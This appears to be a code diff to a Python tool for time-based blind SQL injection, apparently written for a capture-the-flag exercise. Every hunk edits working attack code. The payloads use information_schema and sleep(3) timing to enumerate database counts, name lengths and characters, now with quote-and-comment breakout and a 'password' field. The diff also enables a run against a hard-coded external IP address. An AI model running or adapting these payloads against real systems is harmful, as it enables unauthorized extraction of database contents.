@@ -28,10 +28,10 @@ class Database:
     def __num_of_database(self):
         payload = {}
         for i in range(1, 100):
-            # print(i, sep=" ", end=" ")
+            print(i, sep=" ", end=" ")
             time.sleep(1)
-            msg_database = "1 and if(((select count(schema_name) from information_schema.schemata)=" + str(i) + "),sleep(3),1)"
-            payload["sql"] = msg_database
+            msg_database = "1' and if(((select count(schema_name) from information_schema.schemata)=" + str(i) + "),sleep(3),1) -- "
+            payload["password"] = msg_database
             time1 = time.time()
             request(method, self.url, payload)
             if time.time() - time1 > 3:
@@ -46,7 +46,7 @@ class Database:
         for i in range(1, self.information["num_of_database"] + 1):
             for k in range(1, 40):
                 time.sleep(1)
-                msg = "1 and if((select length(schema_name) from information_schema.schemata limit " + str(i - 1) + ",1)=" + str(k) + ",sleep(3),1)"
+                msg = "1' and if((select length(schema_name) from information_schema.schemata limit " + str(i - 1) + ",1)=" + str(k) + ",sleep(3),1) -- "
                 # print(msg)
                 payload["sql"] = msg
                 time1 = time.time()
@@ -67,7 +67,7 @@ class Database:
             for k in range(1, self.information["length_of_each_database"]["database " + str(i + 1)] + 1):  # 查询每个数据库名字
                 for a in printable:
                     time.sleep(1)
-                    msg = "1 and if((SELECT ascii(substr((select SCHEMA_NAME)," + str(k) + ",1)) from information_schema.SCHEMATA LIMIT " + str(i) + ",1)=" + str(ord(a)) + ", sleep(3), 1)"
+                    msg = "1' and if((SELECT ascii(substr((select SCHEMA_NAME)," + str(k) + ",1)) from information_schema.SCHEMATA LIMIT " + str(i) + ",1)=" + str(ord(a)) + ", sleep(3), 1) -- "
                     # print(msg)
                     payload["sql"] = msg
                     time1 = time.time()
@@ -228,10 +228,10 @@ class TableDetails: #爆全部信息
                     break
 
 
-# a = Database(url="http://172.81.251.91:9999/index.php")
+a = Database(url="http://101.200.32.147/index.php?id=")
 # a = Database(url="http://127.0.0.1/sql_time/index.php")
-# a.start()
+a.start()
 # b = TableInformation(url="http://172.81.251.91:9999/index.php", database_name="flag")
 # b.start()
-c = TableDetails(url="http://172.81.251.91:9999/index.php", database_name="flag", table_name="flag")
-c.start()
+# c = TableDetails(url="http://172.81.251.91:9999/index.php", database_name="flag", table_name="flag")
+# c.start()
